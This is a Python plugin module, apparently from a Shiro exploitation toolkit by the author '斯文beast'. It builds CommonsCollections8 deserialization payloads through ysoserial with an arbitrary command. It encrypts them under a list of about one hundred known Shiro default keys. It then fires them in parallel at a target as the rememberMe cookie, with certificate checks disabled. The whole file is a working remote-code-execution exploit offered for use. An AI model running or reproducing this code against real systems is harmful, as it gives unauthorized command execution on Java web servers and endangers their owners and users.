# -*- coding: utf-8 -*-
# By 斯文beast  svenbeast.com

import os
import re
import base64
import uuid
import subprocess
import requests
import sys
import threadpool
from Crypto.Cipher import AES
from ..main import Idea
requests.packages.urllib3.disable_warnings()

JAR_FILE = 'moule/ysoserial.jar'

@Idea.plugin_register('Class9:CommonsCollections8')
class CommonsCollections8(object):
    def process(self,url,command, thre):
        self.poc(url,command, thre)
        
    def generator(self, String, fp=JAR_FILE):

        key_rule = re.compile('(.*?)1234url3456')
        url_rule = re.compile('1234url3456(.*?)1234command3456')
        command_rule = re.compile('1234command3456(.*?)1234sven3456')

        key = key_rule.findall(String)[0]
        target = url_rule.findall(String)[0]
        command = command_rule.findall(String)[0]

        if not os.path.exists(fp):
            raise Exception('jar file not found!')
        popen = subprocess.Popen(['java', '-jar', fp, 'CommonsCollections8', command],       #popen
                                    stdout=subprocess.PIPE)
        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        mode = AES.MODE_CBC
        iv = uuid.uuid4().bytes
        encryptor = AES.new(base64.b64decode(key), mode, iv)   #受key影响的encryptor
        file_body = pad(popen.stdout.read())         #受popen影响的file_body
        payload = base64.b64encode(iv + encryptor.encrypt(file_body))
        header={
            'User-agent' : 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0;'
            }
        try:
            r = requests.get(target,  headers=header, cookies={'rememberMe': payload.decode()+"="}, verify=False,timeout=20)  # 发送验证请求1
            #print("payload1已完成,字段rememberMe:看需要自己到源代码print "+payload.decode())
            if(r.status_code==200):
                print("[+]   CommonsCollections8模块   key: {} 已成功发送！  状态码:{}".format(str(key),str(r.status_code)))
            else:
                print("[-]   CommonsCollections8模块   key: {} 发送异常！\n[-]   状态码:{}".format(str(key),str(r.status_code)))
        except Exception as e:
            print(e) 
        return False

    def multithreading(self,funcname,url ,command, pools):

        '''
        key = ['kPH+bIxk5D2deZiIxcaaaA==1234url3456'+url+'1234command3456'+command+'1234sven3456','wGiHplamyXlVB11UXWol8g==1234url3456'+url+'1234command3456'+command+'1234sven3456','2AvVhdsgUs0FSA3SDFAdag==1234url3456'+url+'1234command3456'+command+'1234sven3456','4AvVhmFLUs0KTA3Kprsdag==1234url3456'+url+'1234command3456'+command+'1234sven3456',
            '3AvVhmFLUs0KTA3Kprsdag==1234url3456'+url+'1234command3456'+command+'1234sven3456','Z3VucwAAAAAAAAAAAAAAAA==1234url3456'+url+'1234command3456'+command+'1234sven3456','U3ByaW5nQmxhZGUAAAAAAA==1234url3456'+url+'1234command3456'+command+'1234sven3456','wGiHplamyXlVB11UXWol8g==1234url3456'+url+'1234command3456'+command+'1234sven3456',
            '6ZmI6I2j5Y+R5aSn5ZOlAA==1234url3456'+url+'1234command3456'+command+'1234sven3456','fCq+/xW488hMTCD+cmJ3aQ==1234url3456'+url+'1234command3456'+command+'1234sven3456','1QWLxg+NYmxraMoxAXu/Iw==1234url3456'+url+'1234command3456'+command+'1234sven3456','ZUdsaGJuSmxibVI2ZHc9PQ==1234url3456'+url+'1234command3456'+command+'1234sven3456',
            'L7RioUULEFhRyxM7a2R/Yg==1234url3456'+url+'1234command3456'+command+'1234sven3456','r0e3c16IdVkouZgk1TKVMg==1234url3456'+url+'1234command3456'+command+'1234sven3456','5aaC5qKm5oqA5pyvAAAAAA==1234url3456'+url+'1234command3456'+command+'1234sven3456','bWluZS1hc3NldC1rZXk6QQ==1234url3456'+url+'1234command3456'+command+'1234sven3456',
            'a2VlcE9uR29pbmdBbmRGaQ==1234url3456'+url+'1234command3456'+command+'1234sven3456','WcfHGU25gNnTxTlmJMeSpw==1234url3456'+url+'1234command3456'+command+'1234sven3456','bWljcm9zAAAAAAAAAAAAAA==1234url3456'+url+'1234command3456'+command+'1234sven3456','MTIzNDU2Nzg5MGFiY2RlZg==1234url3456'+url+'1234command3456'+command+'1234sven3456',
            '5AvVhmFLUs0KTA3Kprsdag==1234url3456'+url+'1234command3456'+command+'1234sven3456']
            '''
        key = [
                'kPH+bIxk5D2deZiIxcaaaA==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'wGiHplamyXlVB11UXWol8g==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                '2AvVhdsgUs0FSA3SDFAdag==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                '4AvVhmFLUs0KTA3Kprsdag==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                '3AvVhmFLUs0KTA3Kprsdag==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'Z3VucwAAAAAAAAAAAAAAAA==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'U3ByaW5nQmxhZGUAAAAAAA==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                '6ZmI6I2j5Y+R5aSn5ZOlAA==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'fCq+/xW488hMTCD+cmJ3aQ==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                '1QWLxg+NYmxraMoxAXu/Iw==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'ZUdsaGJuSmxibVI2ZHc9PQ==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'L7RioUULEFhRyxM7a2R/Yg==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'r0e3c16IdVkouZgk1TKVMg==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                '5aaC5qKm5oqA5pyvAAAAAA==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'bWluZS1hc3NldC1rZXk6QQ==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'a2VlcE9uR29pbmdBbmRGaQ==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'WcfHGU25gNnTxTlmJMeSpw==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'bWljcm9zAAAAAAAAAAAAAA==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'MTIzNDU2Nzg5MGFiY2RlZg==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                '5AvVhmFLUs0KTA3Kprsdag==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                '0AvVhmFLUs0KTA3Kprsdag==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                '1AvVhdsgUs0FSA3SDFAdag==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                '25BsmdYwjnfcWmnhAciDDg==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                '3JvYhmBLUs0ETA5Kprsdag==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                '6AvVhmFLUs0KTA3Kprsdag==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                '6NfXkC7YVCV5DASIrEm1Rg==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'cmVtZW1iZXJNZQAAAAAAAA==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                '7AvVhmFLUs0KTA3Kprsdag==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                '8AvVhmFLUs0KTA3Kprsdag==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                '8BvVhmFLUs0KTA3Kprsdag==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                '9AvVhmFLUs0KTA3Kprsdag==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'OUHYQzxQ/W9e/UjiAGu6rg==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'a3dvbmcAAAAAAAAAAAAAAA==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'aU1pcmFjbGVpTWlyYWNsZQ==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'bXRvbnMAAAAAAAAAAAAAAA==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'OY//C4rhfwNxCQAQCrQQ1Q==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                '5J7bIJIV0LQSN3c9LPitBQ==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'f/SY5TIve5WWzT4aQlABJA==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'bya2HkYo57u6fWh5theAWw==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'WuB+y2gcHRnY2Lg9+Aqmqg==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                '3qDVdLawoIr1xFd6ietnwg==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'ZWvohmPdUsAWT3=KpPqda1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'YI1+nBV//m7ELrIyDHm6DQ==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                '6Zm+6I2j5Y+R5aS+5ZOlAA==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                '2A2V+RFLUs+eTA3Kpr+dag==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                '6ZmI6I2j3Y+R1aSn5BOlAA==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'SkZpbmFsQmxhZGUAAAAAAA==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                '2cVtiE83c4lIrELJwKGJUw==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'fsHspZw/92PrS3XrPW+vxw==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'XTx6CKLo/SdSgub+OPHSrw==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'sHdIjUN6tzhl8xZMG3ULCQ==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'O4pdf+7e+mZe8NyxMTPJmQ==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'HWrBltGvEZc14h9VpMvZWw==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'rPNqM6uKFCyaL10AK51UkQ==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'Y1JxNSPXVwMkyvES/kJGeQ==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'lT2UvDUmQwewm6mMoiw4Ig==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'MPdCMZ9urzEA50JDlDYYDg==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'xVmmoltfpb8tTceuT5R7Bw==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'c+3hFGPjbgzGdrC+MHgoRQ==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'ClLk69oNcA3m+s0jIMIkpg==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'Bf7MfkNR0axGGptozrebag==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                '1tC/xrDYs8ey+sa3emtiYw==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'ZmFsYWRvLnh5ei5zaGlybw==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'cGhyYWNrY3RmREUhfiMkZA==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'IduElDUpDDXE677ZkhhKnQ==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'yeAAo1E8BOeAYfBlm4NG9Q==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'cGljYXMAAAAAAAAAAAAAAA==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                '2itfW92XazYRi5ltW0M2yA==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'XgGkgqGqYrix9lI6vxcrRw==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'ertVhmFLUs0KTA3Kprsdag==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                '5AvVhmFLUS0ATA4Kprsdag==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                's0KTA3mFLUprK4AvVhsdag==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'hBlzKg78ajaZuTE0VLzDDg==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                '9FvVhtFLUs0KnA3Kprsdyg==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'd2ViUmVtZW1iZXJNZUtleQ==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'yNeUgSzL/CfiWw1GALg6Ag==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'NGk/3cQ6F5/UNPRh8LpMIg==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                '4BvVhmFLUs0KTA3Kprsdag==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'MzVeSkYyWTI2OFVLZjRzZg==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'CrownKey==a12d/dakdad1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'empodDEyMwAAAAAAAAAAAA==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'A7UzJgh1+EWj5oBFi+mSgw==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'c2hpcm9fYmF0aXMzMgAAAA==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'i45FVt72K2kLgvFrJtoZRw==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'U3BAbW5nQmxhZGUAAAAAAA==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'ZnJlc2h6Y24xMjM0NTY3OA==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'Jt3C93kMR9D5e8QzwfsiMw==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'MTIzNDU2NzgxMjM0NTY3OA==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'vXP33AonIp9bFwGl7aT7rA==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'V2hhdCBUaGUgSGVsbAAAAA==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'Z3h6eWd4enklMjElMjElMjE=1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'Q01TX0JGTFlLRVlfMjAxOQ==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'ZAvph3dsQs0FSL3SDFAdag==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'Is9zJ3pzNh2cgTHB4ua3+Q==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'NsZXjXVklWPZwOfkvk6kUA==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'GAevYnznvgNCURavBhCr1w==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                '66v1O8keKNV3TTcGPK1wzg==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'SDKOLKn2J1j/2BHjeZwAoQ==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                '4AvVhmFLUsOKTA3Kprsdag==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                's2SE9y32PvLeYo+VGFpcKA==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'RVZBTk5JR0hUTFlfV0FPVQ==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'WkhBTkdYSUFPSEVJX0NBVA==1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'kPv59vyqzj00x11LXJZTjJ2UHW48jzHN1234url3456'+url+'1234command3456'+command+'1234sven3456',
                'YTM0NZomIzI2OTsmIzM0NTueYQ==1234url3456'+url+'1234command3456'+command+'1234sven3456'
            ]

        pool = threadpool.ThreadPool(pools)
        requests = threadpool.makeRequests(funcname,key)
        [pool.putRequest(req) for req in requests]
        pool.wait()
    def poc(self,url, command, thre):

        self.multithreading(self.generator, url, command, thre)
        return False


